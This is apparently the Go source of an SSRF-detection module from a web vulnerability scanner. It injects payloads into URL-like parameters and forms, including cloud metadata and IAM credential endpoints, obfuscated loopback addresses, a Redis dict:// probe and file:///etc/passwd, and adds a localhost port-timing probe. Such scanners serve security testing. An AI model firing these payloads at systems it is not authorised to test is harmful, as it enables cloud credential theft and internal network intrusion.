package modules

import (
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net/http"
	"net/url"
	"strings"
	"time"
)

var ssrfURLParams = []string{
	"url", "uri", "src", "source", "href", "dest", "destination",
	"redirect", "target", "redir", "page", "path", "file",
	"fetch", "load", "next", "ref", "return", "link",
	"location", "host", "endpoint", "resource", "callback",
	"webhook", "proxy", "out_url",
}

type ssrfProbe struct {
	Payload string
	Label   string
	Markers []string
}

var ssrfProbes = []ssrfProbe{
	{
		Payload: "http://169.254.169.254/latest/meta-data/",
		Label:   "AWS IMDS v1",
		Markers: []string{"ami-id", "instance-id", "security-credentials", "iam", "hostname"},
	},
	{
		Payload: "http://169.254.169.254/latest/meta-data/iam/",
		Label:   "AWS IMDS IAM",
		Markers: []string{"security-credentials", "iam"},
	},
	{
		Payload: "http://metadata.google.internal/computeMetadata/v1/",
		Label:   "GCP Metadata",
		Markers: []string{"computeMetadata", "instance", "project"},
	},
	{
		Payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		Label:   "Azure IMDS",
		Markers: []string{"vmId", "subscriptionId", "resourceGroupName", "azEnvironment"},
	},
	{
		Payload: "http://localhost/",
		Label:   "Localhost HTTP",
		Markers: []string{},
	},
	{
		Payload: "http://127.0.0.1/",
		Label:   "Loopback HTTP",
		Markers: []string{},
	},
	{
		Payload: "http://2130706433/",
		Label:   "Loopback decimal 2130706433",
		Markers: []string{},
	},
	{
		Payload: "http://0x7f000001/",
		Label:   "Loopback hex 0x7f000001",
		Markers: []string{},
	},
	{
		Payload: "http://127.1/",
		Label:   "Loopback shorthand 127.1",
		Markers: []string{},
	},
	{
		Payload: "http://[::1]/",
		Label:   "Loopback IPv6 ::1",
		Markers: []string{},
	},
	{
		Payload: "http://017700000001/",
		Label:   "Loopback octal",
		Markers: []string{},
	},
	{
		Payload: "http://100.100.100.200/latest/meta-data/",
		Label:   "Aliyun Metadata",
		Markers: []string{"instance-id", "hostname", "region-id", "zone-id"},
	},
	{
		Payload: "dict://127.0.0.1:6379/INFO",
		Label:   "Redis dict://",
		Markers: []string{"redis_version", "tcp_port", "uptime_in_seconds"},
	},
	{
		Payload: "file:///etc/passwd",
		Label:   "file:///etc/passwd",
		Markers: []string{"root:x:", "nobody:x:", "/bin/bash", "/sbin/nologin"},
	},
	{
		Payload: "file:///etc/hostname",
		Label:   "file:///etc/hostname",
		Markers: []string{},
	},
	{
		Payload: "http://192.168.1.1/",
		Label:   "Private range 192.168.1.1",
		Markers: []string{"router", "admin", "password", "login"},
	},
	{
		Payload: "http://10.0.0.1/",
		Label:   "Private range 10.0.0.1",
		Markers: []string{"router", "admin", "login"},
	},
}

var ssrfErrorMarkers = []string{
	"failed to connect",
	"connection refused",
	"unable to resolve",
	"could not resolve",
	"getaddrinfo failed",
	"name or service not known",
	"no route to host",
	"connection timed out",
	"connection reset",
	"socket operation",
	"request failed",
	"proxy error",
}

func isSSRFParam(param string) bool {
	low := strings.ToLower(param)
	lowerStrip := strings.NewReplacer("_", "", "-", "", ".", "").Replace(low)
	for _, kw := range ssrfURLParams {
		kwStrip := strings.NewReplacer("_", "", "-", "", ".", "").Replace(kw)
		if kwStrip == "" {
			continue
		}
		if lowerStrip == kwStrip {
			return true
		}
		if strings.ContainsAny(low, "_-.") &&
			strings.Contains(lowerStrip, kwStrip) && !containsCommonSSRFParam(kw) {
			return true
		}
	}
	return false
}

func containsCommonSSRFParam(kw string) bool {
	switch kw {
	case "page", "path", "host", "next", "src":
		return true
	}
	return false
}

func ScanSSRF(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	} else {
		params = url.Values{}
	}

	for param := range params {
		if !isSSRFParam(param) {
			if cfg.Verbose {
				output.Verbose("[ssrf] skip param=%s (not URL-like)", param)
			}
			continue
		}
		if cfg.Verbose {
			output.Verbose("[ssrf-get] param=%s", param)
		}

		safeURL, _ := core.SetParam(target.URL, param, "safe")
		baseline, _, err := core.DoGET(client, cfg, safeURL)
		if err != nil || baseline == "" {
			continue
		}

	SSRFURLLoop:
		for _, probe := range ssrfProbes {
			testURL, err := core.SetParam(target.URL, param, probe.Payload)
			if err != nil {
				continue
			}
			body, status, err := core.DoGET(client, cfg, testURL)
			if err != nil {
				continue
			}

			bodyLow := strings.ToLower(body)
			probeLow := strings.ToLower(probe.Payload)

			for _, marker := range probe.Markers {
				markerLow := strings.ToLower(marker)
				if strings.Contains(probeLow, markerLow) {
					continue
				}
				if strings.Contains(bodyLow, markerLow) &&
					!strings.Contains(strings.ToLower(baseline), markerLow) {
					results = append(results, core.ScanResult{
						Type: "SSRF (Server-Side Request Forgery)",
						URL:  testURL, Method: "GET", Parameter: param,
						Payload: probe.Payload, Severity: "CRITICAL",
						Evidence:  fmt.Sprintf("[%s] marker %q in response (HTTP %d)", probe.Label, marker, status),
						Timestamp: time.Now(),
					})
					break SSRFURLLoop
				}
			}

			for _, errMark := range ssrfErrorMarkers {
				if strings.Contains(bodyLow, errMark) && !strings.Contains(strings.ToLower(baseline), errMark) {
					results = append(results, core.ScanResult{
						Type: "SSRF (Error Leakage)",
						URL:  testURL, Method: "GET", Parameter: param,
						Payload: probe.Payload, Severity: "HIGH",
						Evidence:  fmt.Sprintf("[%s] error marker %q leaked in response (HTTP %d)", probe.Label, errMark, status),
						Timestamp: time.Now(),
					})
					break SSRFURLLoop
				}
			}
		}

		if !containsSSRFResult(results, target.URL, param) {
			if tr := ssrfTimingProbe(client, cfg, target.URL, param); tr != nil {
				results = append(results, *tr)
			}
		}
	}

	for _, form := range target.Forms {
		for _, inp := range form.Inputs {
			if !isSSRFParam(inp.Name) {
				continue
			}
			if cfg.Verbose {
				output.Verbose("[ssrf-form] %s %s input=%s\n", form.Method, form.Action, inp.Name)
			}

			var baseline string
			var baseErr error
			if form.Method == "POST" {
				baseline, _, baseErr = core.DoPOST(client, cfg, form.Action, core.FormDefaults(form))
			} else {
				d := core.FormDefaults(form)
				d.Set(inp.Name, "safe")
				u, _ := core.SetFormParams(form.Action, d)
				baseline, _, baseErr = core.DoGET(client, cfg, u)
			}
			if baseErr != nil || baseline == "" {
				continue
			}

		SSRFFormLoop:
			for _, probe := range ssrfProbes {
				var body string
				var status int
				var err error

				if form.Method == "POST" {
					d := core.FormDefaults(form)
					d.Set(inp.Name, probe.Payload)
					body, status, err = core.DoPOST(client, cfg, form.Action, d)
				} else {
					d := core.FormDefaults(form)
					d.Set(inp.Name, probe.Payload)
					u, _ := core.SetFormParams(form.Action, d)
					body, status, err = core.DoGET(client, cfg, u)
				}
				if err != nil {
					continue
				}

				bodyLow := strings.ToLower(body)
				probeLow := strings.ToLower(probe.Payload)

				for _, marker := range probe.Markers {
					markerLow := strings.ToLower(marker)
					if strings.Contains(probeLow, markerLow) {
						continue
					}
					if strings.Contains(bodyLow, markerLow) &&
						!strings.Contains(strings.ToLower(baseline), markerLow) {
						results = append(results, core.ScanResult{
							Type: "SSRF via core.Form (Server-Side Request Forgery)",
							URL:  form.Action, Method: form.Method, Parameter: inp.Name,
							Payload: probe.Payload, Severity: "CRITICAL",
							Evidence:  fmt.Sprintf("[%s] marker %q in response (HTTP %d)", probe.Label, marker, status),
							Timestamp: time.Now(),
						})
						break SSRFFormLoop
					}
				}

				for _, errMark := range ssrfErrorMarkers {
					if strings.Contains(bodyLow, errMark) && !strings.Contains(strings.ToLower(baseline), errMark) {
						results = append(results, core.ScanResult{
							Type: "SSRF via core.Form (Error Leakage)",
							URL:  form.Action, Method: form.Method, Parameter: inp.Name,
							Payload: probe.Payload, Severity: "HIGH",
							Evidence:  fmt.Sprintf("[%s] error marker %q leaked in response (HTTP %d)", probe.Label, errMark, status),
							Timestamp: time.Now(),
						})
						break SSRFFormLoop
					}
				}
			}

			if !containsSSRFResult(results, form.Action, inp.Name) {
				if tr := ssrfTimingProbe(client, cfg, form.Action, inp.Name); tr != nil {
					results = append(results, *tr)
				}
			}
		}
	}

	return results
}

func containsSSRFResult(results []core.ScanResult, rawURL, param string) bool {
	want := core.StripQuery(rawURL)
	for _, r := range results {
		if r.Parameter == param && strings.HasPrefix(r.Type, "SSRF") && core.StripQuery(r.URL) == want {
			return true
		}
	}
	return false
}

func ssrfTimingProbe(client *http.Client, cfg *core.Config, rawURL, param string) *core.ScanResult {
	openPayload := "http://127.0.0.1:22/"
	closedPayload := "http://127.0.0.1:1/"

	urlOpen, _ := core.SetParam(rawURL, param, openPayload)
	urlClosed, _ := core.SetParam(rawURL, param, closedPayload)

	baselineURL, _ := core.SetParam(rawURL, param, "sxssrf_baseline_marker")
	var baseSamples []time.Duration
	for i := 0; i < 3; i++ {
		t0 := time.Now()
		if _, _, err := core.DoGET(client, cfg, baselineURL); err != nil {
			return nil
		}
		baseSamples = append(baseSamples, time.Since(t0))
	}
	baseAvg := ssrfAvgDuration(baseSamples)
	baseJitter := maxDuration(baseSamples) - minDuration(baseSamples)

	var openSamples []time.Duration
	for i := 0; i < 3; i++ {
		t0 := time.Now()
		if _, _, err := core.DoGET(client, cfg, urlOpen); err != nil {
			return nil
		}
		openSamples = append(openSamples, time.Since(t0))
	}
	openTime := minDuration(openSamples)

	var closedSamples []time.Duration
	for i := 0; i < 3; i++ {
		t0 := time.Now()
		if _, _, err := core.DoGET(client, cfg, urlClosed); err != nil {
			return nil
		}
		closedSamples = append(closedSamples, time.Since(t0))
	}
	closedTime := minDuration(closedSamples)

	if openTime-baseAvg < 2*time.Second || baseJitter >= time.Second {
		return nil
	}
	if closedTime > openTime-2*time.Second {
		return nil
	}

	return &core.ScanResult{
		Type: "SSRF (Timing/Port-Scan)",
		URL:  urlOpen, Method: "GET", Parameter: param,
		Payload:   fmt.Sprintf("open: %s vs closed: %s", openPayload, closedPayload),
		Severity:  "HIGH",
		Evidence:  fmt.Sprintf("open-port %v vs baseline avg %v (baseline jitter %v, closed %v)", openTime.Round(time.Millisecond), baseAvg.Round(time.Millisecond), baseJitter.Round(time.Millisecond), closedTime.Round(time.Millisecond)),
		Timestamp: time.Now(),
	}
}

func ssrfAvgDuration(ds []time.Duration) time.Duration {
	if len(ds) == 0 {
		return 0
	}
	var sum time.Duration
	for _, d := range ds {
		sum += d
	}
	return sum / time.Duration(len(ds))
}

func maxDuration(ds []time.Duration) time.Duration {
	m := ds[0]
	for _, d := range ds[1:] {
		if d > m {
			m = d
		}
	}
	return m
}

func minDuration(ds []time.Duration) time.Duration {
	m := ds[0]
	for _, d := range ds[1:] {
		if d < m {
			m = d
		}
	}
	return m
}
